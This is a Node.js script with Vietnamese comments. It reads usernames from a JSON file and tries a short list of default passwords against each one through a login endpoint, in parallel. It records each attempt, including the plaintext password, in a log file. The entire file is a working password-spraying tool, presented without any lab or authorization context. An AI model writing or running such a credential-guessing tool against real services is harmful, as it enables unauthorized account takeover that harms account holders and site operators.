const fs = require('fs');
const fetch = require('node-fetch');
const async = require('async');
const moment = require('moment');

// Hàm đọc tệp JSON chứa danh sách tài khoản
function readAccountsFromFile(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error(`Error reading file from disk: ${err}`);
    }
    return [];
}

// Hàm ghi logs khi đăng nhập thành công
function writeLog(url, username, password, status) {
    const logEntry = {
        url: url,
        username: username,
        password: password,
        time: moment().format('YYYY-MM-DD HH:mm:ss'),
        status: status
    };

    fs.appendFileSync('login_logs.json', JSON.stringify(logEntry) + '\n', (err) => {
        if (err) {
            console.error('Error writing log:', err);
        }
    });
}

// Hàm kiểm tra đăng nhập với mật khẩu
async function checkLogin(url, username, passwords) {
    for (let password of passwords) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: username,
                    password: password
                })
            });

            if (response.ok) {
                console.log(`Login successful: ${username}, Password: ${password}`);
                writeLog(url, username, password, 'success');
                return; // Dừng lại khi đăng nhập thành công
            } else {
                console.log(`Login failed for: ${username} with password: ${password}`);
                writeLog(url, username, password, 'failed');
            }
        } catch (error) {
            console.error('Error during login attempt:', error);
            writeLog(url, username, password, 'error');
        }
    }
}

// Hàm chính thực hiện kiểm tra tài khoản từ danh sách
function main() {
    const url = 'https://example.com/login'; // URL để đăng nhập
    const passwords = ['123456', 'password', 'admin']; // Danh sách mật khẩu mặc định
    const accounts = readAccountsFromFile('accounts.json');
    const limit = 3; // Số lượng tác vụ song song cùng lúc

    // Tạo danh sách các tác vụ để thực hiện
    const tasks = accounts.map(account => {
        return async function (callback) {
            await checkLogin(url, account.username, passwords);
            callback();
        };
    });

    // Sử dụng parallelLimit để chạy các tác vụ song song với giới hạn
    async.parallelLimit(tasks, limit, (err, results) => {
        if (err) {
            console.error('Error occurred during parallel execution:', err);
        } else {
            console.log('All tasks completed');
        }
    });
}

main();
